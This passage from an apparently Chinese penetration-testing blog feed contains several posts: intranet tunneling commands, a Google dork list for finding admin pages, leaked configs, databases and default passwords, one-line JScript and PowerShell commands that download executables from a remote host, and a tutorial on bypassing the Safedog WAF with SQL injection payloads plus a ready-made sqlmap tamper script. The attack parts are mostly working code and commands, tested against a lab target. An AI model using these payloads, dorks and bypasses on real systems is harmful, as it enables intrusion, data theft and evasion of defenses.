-rport 8838</span><br></pre></td></tr></table></figure><p>连接成功后出现交互界面 admin node help一下看到功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">help                                     Help information.</span><br><span class="line">exit                                     Exit.</span><br><span class="line">show                                     Display network topology.</span><br><span class="line">getdes                                   View description of the target node.</span><br><span class="line">setdes     [info]                        Add a description to the target node.</span><br><span class="line">goto       [id]                          Select id as the target node.</span><br><span class="line">listen     [lport]                       Listen on a port on the target node.</span><br><span class="line">connect    [rhost] [rport]               Connect to a new node through the target node.</span><br><span class="line">sshconnect [user@ip:port] [dport]        Connect to a new node through ssh tunnel.</span><br><span class="line">shell                                    Start an interactive shell on the target node.</span><br><span class="line">upload     [local_file]  [remote_file]   Upload files to the target node.</span><br><span class="line">download   [remote_file]  [local_file]   Download files from the target node.</span><br><span class="line">socks      [lport]                       Start a socks5 server.</span><br><span class="line">lforward   [lhost] [sport] [dport]       Forward a local sport to a remote dport.</span><br><span class="line">rforward   [rhost] [sport] [dport]       Forward a remote sport to a local dport.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先show 看下拓扑</span><br><span class="line">goto 1  #选择目标1</span><br><span class="line">socks 8886  #在vps上 8886端口上开启代理</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MDkxMDM3NDgucG5n?x-oss-process=image/format,png" alt="image-20200509103748389"></p><p>有意思的是这个还能出一个shell，也挺方便</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MDkxMDQ0MTYucG5n?x-oss-process=image/format,png" alt="image-20200509104416202"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>内网穿透的东西还是比较重要的，内网断网机常常都得用隧道，所以小结一下，选择的时候最好要有较好的稳定性，支持多种协议，流量可加密，推荐使用最后推荐的几种工具，如果只是端口转发推荐netsh和SSH转发较为稳定。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>google hack搜索引擎常用总结</title>
      <link href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>在渗透测试中，利用搜索引擎信息收集还是很不错，常常有意外的收获，也可以用在一些镜像库里面搜索信息收集</li><li>还有之前看到的一些，都总结分享一下</li></ul><h2 id="主要的常用一些语法"><a href="#主要的常用一些语法" class="headerlink" title="主要的常用一些语法"></a>主要的常用一些语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">site：可以限制你搜索范围的域名</span><br><span class="line"></span><br><span class="line">inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.</span><br><span class="line"></span><br><span class="line">intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)</span><br><span class="line"></span><br><span class="line">intitle: 查包含关键词的页面，一般用于社工别人的webshell密码</span><br><span class="line"></span><br><span class="line">filetype：搜索文件的后缀或者扩展名</span><br><span class="line"></span><br><span class="line">intitle：限制你搜索的网页标题.</span><br><span class="line"></span><br><span class="line">link: 可以得到一个所有包含了某个指定URL的页面列表.</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><strong>查找后台地址：site域名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个真的好用</span><br><span class="line">查看某公司的表格找账户：site:域名 filetype:xlsx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找上传漏洞：site:域名 inurl:file|load|editor|Files**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">找web编辑器：</span><br><span class="line"></span><br><span class="line">site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</span><br><span class="line"></span><br><span class="line">存在的数据库：site:域名 filetype:mdb|asp|#</span><br><span class="line"></span><br><span class="line">查看脚本类型：site:域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp</span><br></pre></td></tr></table></figure><h2 id="挖教育常用的"><a href="#挖教育常用的" class="headerlink" title="挖教育常用的"></a>挖教育常用的</h2><p><strong>site：xxx.edu.cn  intext：学号</strong> </p><p><strong>site：xxx.edu.cn  intext：默认密码</strong></p><p><strong>site：xxx.edu.cn  intext：登陆/后台登陆/登陆管理等的登陆页面</strong></p><p>找遗留的各种数据库报错,物理路径,数据库版本,服务器探针类文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">site:*.tw  inurl:&#x2F;phpinfo.php</span><br><span class="line">filetype:log &quot;PHP Parse error&quot;| &quot;PHP Warning&quot;</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_fetch_array()</span><br><span class="line">site:*.jp  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: getimagesize()</span><br><span class="line">site:*.br  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: array_merge()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_fetch_assoc()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_result()</span><br><span class="line">site:*.jp  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: pg_exec()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: require()</span><br><span class="line">inurl:&#x2F;robots.txt site:*.*</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">1 目录遍历漏洞  语法为: site:baidu.com intitle:index.of</span><br><span class="line"></span><br><span class="line">2 配置文件泄露  语法为: site:baidu.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | extra | ext:ini</span><br><span class="line"></span><br><span class="line">3 数据库文件泄露  site:baidu.com ext:sql | ext:dbf | ext:mdb</span><br><span class="line"></span><br><span class="line">4 日志文件泄露 site:baidu.com ext:log</span><br><span class="line"></span><br><span class="line">5 备份和历史文件 site:baidu.com ext:bkf | ext:bkp | ext:bak | extld | ext:backup</span><br><span class="line"></span><br><span class="line">6 SQL错误  site:baidu.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”</span><br><span class="line"></span><br><span class="line">7 公开文件信息  site:baidu.com ext:doc | ext:docx | extdt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class="line"></span><br><span class="line">8  phpinfo()  site:baidu.com ext:php intitle:phpinfo “published by the PHP Group” </span><br><span class="line"></span><br><span class="line">9.不可靠程序透露的信息 </span><br><span class="line"></span><br><span class="line">（1)php version： </span><br><span class="line"></span><br><span class="line">intitle:phpinfo</span><br><span class="line"></span><br><span class="line">inurl:info.php</span><br><span class="line"></span><br><span class="line">(2)程序中含有SQL注入漏洞并且路径可以修改弱口 </span><br><span class="line"></span><br><span class="line">&quot;advanced guestbook * powered&quot;:</span><br><span class="line"></span><br><span class="line">inurl:addentry.php</span><br><span class="line"></span><br><span class="line">intitle:&quot;View img&quot; inurl:viewimg.php</span><br><span class="line"></span><br><span class="line">10.安全扫描报告 &quot;Assessment report&quot; &quot;nessus&quot;: filetype:pdf</span><br><span class="line"></span><br><span class="line">11.数据库程序和错误文件 </span><br><span class="line"></span><br><span class="line">&quot;Welcome to phpmyadmin ***&quot; &quot;running on * as root@*&quot; intitle:phpmyadmin</span><br><span class="line"></span><br><span class="line">&quot;mysql error with query&quot;</span><br><span class="line"></span><br><span class="line">12.暴库</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc&#x2F;conn.asp </span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc+conn.asp </span><br><span class="line"></span><br><span class="line">intext:to parent directory 目录遍历</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc&#x2F;conn.asp</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc+conn.asp</span><br><span class="line"></span><br><span class="line">intext:to parent directory+intext:mdb site:xxx.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话下载payload（持续更新）</title>
      <link href="/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>js一句话下载payload<br>windows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">​</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">​</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;micropoor.exe&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\test&gt;cscript &#x2F;nologo dowfile2.js http:&#x2F;&#x2F;192.168.1.1&#x2F;eval.exe</span><br></pre></td></tr></table></figure><p>还有最简单的powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&#39;,&#39;E:\robots.txt&#39;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单的从绕狗到编写tamper</title>
      <link href="/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/"/>
      <url>/2020/04/21/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8E%E7%BB%95%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h1 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h1><ul><li>安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的</li><li>但是实际情况是需要权衡可用性和安全性</li><li>当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截</li><li>所以最终就是正则的绕过</li><li>注意：</li><li>版本不同，他的正则规则也是不一样的</li><li>所以有的payload在新老版本是不能同吃。</li><li>但是没有关系，你学会这么绕，这都不是问题。</li></ul><h1 id="0x01-首先我们要判断哪个关键字被拦截了"><a href="#0x01-首先我们要判断哪个关键字被拦截了" class="headerlink" title="0x01 首先我们要判断哪个关键字被拦截了"></a>0x01 首先我们要判断哪个关键字被拦截了</h1><p>我们以 order by 3 这个简单的语句为例子</p><p>提供思路就是破坏单词去测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3  （拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 ordwer by 3 （破坏了order 没有拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order bay 3 （破坏了by 没有拦截）</span><br></pre></td></tr></table></figure><p>所以狗拦截的东西就是 order by 两个一起出现</p><p>所有后面的测试都是按照这个思路初步的判断。</p><h1 id="0x02-一些简单的知识点"><a href="#0x02-一些简单的知识点" class="headerlink" title="0x02 一些简单的知识点"></a>0x02 一些简单的知识点</h1><ul><li>绕过的一些基础</li><li>MySql注释内语句也可执行（/*! */）</li><li><code>/*! ....*/</code> 在其他很多地方都是注释。</li><li>但是在mysql中不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在<code>/*!....*/</code>中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!50001 select * from test *&#x2F;;</span><br></pre></td></tr></table></figure><p>这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被执行，基本上只做一个版本的判断。</p><ul><li>Mysql常用的符号</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">换行符号</span><br><span class="line">%0a</span><br><span class="line"></span><br><span class="line">注释符合</span><br><span class="line">%23</span><br><span class="line"></span><br><span class="line">空白字符</span><br><span class="line">&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;</span><br><span class="line"></span><br><span class="line">不同的数据库不太一样，可以自己查一下</span><br></pre></td></tr></table></figure><p>还有一些bypass的常用注释符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*letmetest*&#x2F;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h1 id="0x03-总结安全狗拦截的点"><a href="#0x03-总结安全狗拦截的点" class="headerlink" title="0x03 总结安全狗拦截的点"></a>0x03 总结安全狗拦截的点</h1><ul><li>and 1</li><li>只要and后面接数字，安全狗就会拦截</li><li>order by</li><li>order 后面接by，安全狗就会拦截</li><li>union select</li><li>只要union select 结合就被拦截,实测发现还是对select这个词的更加严格，主要饶select</li><li>database()</li><li>database后面接括号，安全狗就会拦截</li></ul><p>下面是测试成功的例子</p><p>order by 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试 order aby不拦截 ，我们让 by前面的注释掉就可以绕过</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order %23a%0aby 3</span><br></pre></td></tr></table></figure><p>union select绕过 同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure><p>database()绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,%23a%0adatabase&#x2F;*!*&#x2F;(),3</span><br></pre></td></tr></table></figure><p>一个完整的union查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,group_concat(table_name),3 %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure><p>还有一种注释版本号的 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*!44466select*&#x2F; 1,database&#x2F;*!()*&#x2F;,3</span><br></pre></td></tr></table></figure><h1 id="0x04-Sqlmap-tamper的编写"><a href="#0x04-Sqlmap-tamper的编写" class="headerlink" title="0x04 Sqlmap tamper的编写"></a>0x04 Sqlmap tamper的编写</h1><p>tamper是sqlmap对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。</p><p>为了好理解直接典例深刨析：</p><p>我们理解一下一个常用的tamper ：space2comment.py </p><p>这个脚本的功能就是：用“/**/”替换空格符</p><p>下面是完整的代码</p><pre><code>#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file &apos;LICENSE&apos; for copying permission&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    &quot;&quot;&quot;    Replaces space character (&apos; &apos;) with comments &apos;/**/&apos;    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    &gt;&gt;&gt; tamper(&apos;SELECT id FROM users&apos;)    &apos;SELECT/**/id/**/FROM/**/users&apos;    &quot;&quot;&quot;    retVal = payload    if payload:        retVal = &quot;&quot;        quote, doublequote, firstspace = False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace = True                    retVal += &quot;/**/&quot;                    continue            elif payload[i] == &apos;\&apos;&apos;:                quote = not quote            elif payload[i] == &apos;&quot;&apos;:                doublequote = not doublequote            elif payload[i] == &quot; &quot; and not doublequote and not quote:                retVal += &quot;/**/&quot;                continue            retVal += payload[i]    return retVal</code></pre><p>​    </p><h1 id="0x05-tamper主要的三个部分"><a href="#0x05-tamper主要的三个部分" class="headerlink" title="0x05 tamper主要的三个部分"></a>0x05 tamper主要的三个部分</h1><ul><li>第一部分priority</li><li>定义脚本的优先级，用于有多个tamper脚本的先后顺序</li><li>第二部分dependencies函数</li><li>该脚本适用/不适用的范围，也可以不写。</li><li>第三部分tamper函数</li><li>主要就是我们绕过的精华，要替换的内容。</li></ul><p>priority优先级</p><p>使用了多个tamper时，PRIORITY的参数等级较高的tamper先使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br></pre></td></tr></table></figure><p>有大概七个等级  LOWEST LOWER = LOW NORMAL HIGH HIGHER  HIGHEST</p><p>dependencies函数主要是提示用户适用范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上文中没写，就是没有提示，你要自己知道，其实不写也行就直接pass</span><br><span class="line">def dependencies():</span><br><span class="line">     singleTimeWarnMessage(&quot;这里输入想显示的内容“)</span><br></pre></td></tr></table></figure><p>tamper是重头戏</p><p>这是一个简单的双写绕过，tamper里面主要是一个替换的过程</p><p>payload就是那些关键词select union这下，经过替换只有return 回去，就是处理好的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    return payload.replace(&#39;union&#39;,&#39;uniounionn&#39;)</span><br></pre></td></tr></table></figure><p>所以中间具体怎么替换就是你的事情了。只有最后return回去就好了</p><h1 id="0x06-tamper编写测试方法"><a href="#0x06-tamper编写测试方法" class="headerlink" title="0x06 tamper编写测试方法"></a>0x06 tamper编写测试方法</h1><p>这里我说下几个坑点：</p><ul><li>手工过和写tamper不一样，sqlmap的语句和你用的并不一样</li><li>我有两个建议，一个是用slqmap 挂代理到burp去看到底可以不，我没用这个方法，点的有点累</li><li>我是打开 -v 参数，去看payload和提示，看哪里断开，复制payload去手工看看，绕过编写一下tamper</li><li>还有调试过程中 要打开–flush 参数刷新缓存</li><li>还有一个就是你的python代码能力了，如果你只是用简单的replace(）函数，就要注意替换的顺序，</li></ul><ul><li>例如会用到的相似的函数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SESSION_USER()  CURRENT_USER()  USER() </span><br><span class="line">这几个都有 user（） 如果你在最前面 替换了user（） </span><br><span class="line">那么后面就会出现CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;() 我这种绕过就不兼容了</span><br><span class="line">得在后面再自己调整</span><br></pre></td></tr></table></figure><ul><li>下面是我的绕过参数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1&quot; --tamper dogz.py --random-agent --flush -v 3 --batch --dbms mysql --current-user –-tech&#x3D;U</span><br></pre></td></tr></table></figure><h1 id="0x07-结束"><a href="#0x07-结束" class="headerlink" title="0x07 结束"></a>0x07 结束</h1><p>绕狗脚本给大家，如果跑的时候失效了可以按照上面的方法修改修改就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3.7</span><br><span class="line"># Author:Zeo</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.common import singleTimeWarnMessage</span><br><span class="line">from lib.core.enums import DBMS</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    singleTimeWarnMessage(&quot;Zeo_bypass_safedog4.0&quot;)</span><br><span class="line">    </span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload&#x3D;payload.replace(&#39;AND&#39;,&#39;&#x2F;*!44466AND*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;ORDER&#39;,&#39;&#x2F;*!44466order*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;BY&#39;,&#39;%23a%0aby&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;USER()&#39;,&#39;%23a%0aUSER&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;DATABASE()&#39;,&#39;%23a%0aDATABASE&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;SESSION_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;%23a%0aSESSION_USER()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;UNION ALL SELECT&#39;,&#39;UNION ALL &#x2F;*!44466SELECT*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;CURRENT_USER()&#39;)</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><p>最终绕过安全狗成功跑出数据</p><p><img src="https://img-blog.csdnimg.cn/20200421092204127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次360众测仿真实战靶场考核WP</title>
      <link href="/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/"/>
